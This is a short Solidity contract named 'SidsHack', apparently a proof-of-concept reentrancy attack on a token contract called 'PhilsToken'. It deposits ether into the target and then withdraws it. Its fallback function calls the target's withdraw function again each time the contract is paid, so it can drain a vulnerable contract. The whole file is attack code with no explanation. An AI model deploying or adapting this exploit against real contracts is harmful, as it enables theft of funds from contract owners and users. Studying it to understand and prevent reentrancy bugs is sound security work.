pragma solidity^0.4.0;

contract SidsHack {

    address targetAddress;

    function () payable {
        msg.sender.call(bytes4(sha3("withdraw(uint256)")), msg.value);
    }

    function SidsHack(address _target) {
        targetAddress = _target;
    }

    function depositToPhilsToken() payable {
        targetAddress.call.value(msg.value)(bytes4(sha3("deposit()")));
    }

    function withdraw(uint256 _value) {
        targetAddress.call(bytes4(sha3("withdraw(uint256)")), _value);
    }

}
